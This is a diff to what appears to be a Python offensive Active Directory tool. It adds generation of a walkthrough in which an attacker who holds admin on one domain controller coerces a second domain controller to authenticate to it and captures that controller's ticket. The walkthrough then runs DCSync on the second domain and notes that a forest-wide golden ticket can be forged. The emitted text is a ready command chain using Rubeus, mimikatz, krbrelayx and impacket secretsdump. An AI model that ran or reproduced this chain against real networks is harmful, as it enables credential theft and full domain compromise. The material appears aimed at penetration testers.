@@ -2595,6 +2595,61 @@ def summarise_delegation(rows: list[DelegRow], ctx: dict
     return out
 
 
+def _dc_self_route(ctx: dict) -> str:
+    """The 'this DC is itself unconstrained-trusted' walkthrough for the file.
+
+    You are admin on a DC. Every DC is trusted for unconstrained delegation, so
+    any TGT forwarded here (including another DC's, when it authenticates to
+    this one) lands in LSASS and can be reused. The classic use is a
+    cross-domain / cross-forest capture: coerce a PARENT-domain DC to
+    authenticate to this one, catch its TGT, DCSync the parent.
+
+    Mirrors the unconstrained-computer PATH (a)/(b), but here the catcher runs
+    on THIS box (you already own it) and the coercion target is the OTHER DC.
+    Values that can't be known — the other DC's name/IP — stay <ANGLE>."""
+    k = _deleg_known(ctx)
+    dom, this_dc = k["dom"], k["dc_fqdn"]
+    this_short = k["dc_nb"]
+    box = _route_box("THIS DC is unconstrained-trusted — capture ANOTHER DC's TGT")
+    body = (
+        "# You are admin on this DC. It is trusted for unconstrained delegation\n"
+        "# (every DC is), so any TGT forwarded here is reusable. findDelegation\n"
+        "# omits DCs, so this is never a \"finding\" — but it is a real attack:\n"
+        "# coerce ANOTHER DC (typically a PARENT-domain DC over a trust) to\n"
+        "# authenticate here, catch its TGT, then DCSync that domain.\n"
+        "#\n"
+        "# GET     : the OTHER DC's TGT -> DCSync of its domain (parent forest = EA)\n"
+        "# REQUIRED: SYSTEM/admin on THIS DC (have it) + a reachable other DC\n"
+        "# MISSING : the other DC's hostname/IP (fill <OTHER-DC> below)\n"
+        "# WHY     : a forwarded TGT to an unconstrained host lands in LSASS; a\n"
+        "#           DC authenticating to another DC forwards a DC TGT\n"
+        "#\n"
+        "# ══ PATH (a): catch it on THIS DC (Rubeus, elevated PowerShell) ══\n"
+        "# 1. start the monitor here, filtering for the OTHER DC's account:\n"
+        "Rubeus.exe monitor /interval:5 /nowrap /filteruser:<OTHER-DC-NETBIOS>$\n"
+        "# 2. coerce the OTHER DC to authenticate to THIS one "
+        f"({this_short}):\n"
+        + _coerce_block(dict(ctx, ip="<OTHER-DC-IP>"), this_short)
+        + "# 3. Rubeus prints the OTHER DC's base64 TGT — inject and DCSync:\n"
+        "Rubeus.exe ptt /ticket:<base64-blob>\n"
+        "mimikatz # lsadump::dcsync /domain:<OTHER-DOMAIN> /all\n"
+        "#\n"
+        "# ══ PATH (b): catch it from Kali (krbrelayx, using THIS DC's key) ══\n"
+        "# THIS DC's own machine hash (dump it locally as admin) decrypts the\n"
+        "# forwarded ticket. Start krbrelayx in unconstrained mode:\n"
+        f"krbrelayx.py -hashes :<{this_short}-nthash>\n"
+        "# point a DNS name at you and coerce the OTHER DC to it, then the\n"
+        "# dropped ccache is the OTHER DC's TGT:\n"
+        f"export KRB5CCNAME='<OTHER-DC-NETBIOS>$@<OTHER-DOMAIN>.ccache'\n"
+        "impacket-secretsdump -k -no-pass -just-dc <other-dc.fqdn>\n"
+        "#\n"
+        "# Cross-forest note: if <OTHER-DC> is a PARENT domain, its krbtgt +\n"
+        "# the Enterprise Admins SID (-519) forges a forest-wide golden ticket\n"
+        "# (see the child->parent block in the main suggestions)."
+    )
+    return "\n".join(box) + "\n\n" + _prettify_route(body)
+
+
 def delegation_file_text(rows: list[DelegRow], ctx: dict, target: str,
                          domain: str) -> str:
     """Full delegation command set, as a standalone readable file."""
@@ -2617,6 +2672,16 @@ def delegation_file_text(rows: list[DelegRow], ctx: dict, target: str,
         lines.extend(_route_box(f"[{i}/{len(routes)}]  {label}"))
         lines.append("")
         lines.append(_prettify_route(cmd))
+
+    # This-DC-is-unconstrained walkthrough. Every DC is trusted for
+    # unconstrained delegation, and findDelegation omits DCs, so this never
+    # appears as a "finding" — but with admin on this DC it is a real attack:
+    # capture ANOTHER DC's TGT (e.g. a parent-domain DC over a trust) by
+    # coercing it to authenticate here. ctx["dc_self"] is set by the Reporter
+    # only when we're admin on a DC, so the block is emitted exactly then.
+    if ctx.get("dc_self"):
+        lines.append("")
+        lines.append(_dc_self_route(ctx))
 
     # Domain-wide context: every kerberoastable account the sweep found. These
     # are separate from delegation but are the same "get a cred" currency, so
@@ -3567,7 +3632,12 @@ class Reporter:
         own file. Findings belong on screen; command lists belong in a file
         you open when you are ready to act on one."""
         rows = getattr(result, "deleg_rows", [])
-        if not rows or self.cfg.deleg_inline:
+        # We write the file when there are delegation findings OR when we're
+        # admin on a DC — because a DC is itself unconstrained-trusted, so the
+        # DC-to-DC capture walkthrough belongs in the file even with zero
+        # findings (the common case).
+        dc_self = bool(result.is_dc and any(s.is_admin for s in result.successes))
+        if (not rows and not dc_self) or self.cfg.deleg_inline:
             return
         cred = None
         for s in sorted(result.successes, key=success_sort_key):
@@ -3583,6 +3653,7 @@ class Reporter:
             ctx = build_context(cred, ip, result.hostname, result.is_dc, dom)
             dctx = _deleg_ctx_from(ctx, cred, ip, result.hostname, getattr(result, "maq", None))
             dctx["roastable_sweep"] = getattr(result, "roastable_sweep", []) or []
+            dctx["dc_self"] = dc_self       # emit the DC-to-DC walkthrough block
         except Exception:
             return
 
@@ -3604,21 +3675,28 @@ class Reporter:
         except OSError as exc:
             self._deleg_write_error = str(exc)
 
-        lines = summarise_delegation(rows, dctx)
-        print(f"  {CYAN}{BOLD}🔑 Delegation — {len(rows)} finding(s){RESET}")
-        print(f"  {'─' * (BANNER_WIDTH - 2)}")
-        width = max((len(a) for a, _, _ in lines), default=0)
-        # Uniform, factual: account · what it gets you · what is still missing.
-        # No ranking, no highlight — every finding reads the same.
-        for account, gets, gap in lines:
-            miss = f"   {DIM}need: {gap}{RESET}" if gap else ""
-            print(f"      {BOLD}{account:<{width}}{RESET}  {gets}{miss}")
-        if written:
-            print(f"\n    {DIM}full commands → {RESET}{BOLD}{path}{RESET}")
-        else:
-            print(f"\n    {YELLOW}could not write {path}: "
-                  f"{getattr(self, '_deleg_write_error', 'error')}{RESET}")
-        print()
+        if rows:
+            lines = summarise_delegation(rows, dctx)
+            print(f"  {CYAN}{BOLD}🔑 Delegation — {len(rows)} finding(s){RESET}")
+            print(f"  {'─' * (BANNER_WIDTH - 2)}")
+            width = max((len(a) for a, _, _ in lines), default=0)
+            # Uniform, factual: account · what it gets you · what's missing.
+            # No ranking, no highlight — every finding reads the same.
+            for account, gets, gap in lines:
+                miss = f"   {DIM}need: {gap}{RESET}" if gap else ""
+                print(f"      {BOLD}{account:<{width}}{RESET}  {gets}{miss}")
+            if written:
+                print(f"\n    {DIM}full commands → {RESET}{BOLD}{path}{RESET}")
+            else:
+                print(f"\n    {YELLOW}could not write {path}: "
+                      f"{getattr(self, '_deleg_write_error', 'error')}{RESET}")
+            print()
+        elif written:
+            # No delegation findings, but we wrote the file for the DC-to-DC
+            # walkthrough — the on-screen note (next section) explains why, so
+            # here we just point at the commands.
+            print(f"  {DIM}DC-to-DC unconstrained commands → {RESET}"
+                  f"{BOLD}{path}{RESET}\n")
 
     def _dc_self_delegation_note(self, result: TargetResult) -> None:
         """The DC you're on is ITSELF unconstrained-delegation-trusted (every DC
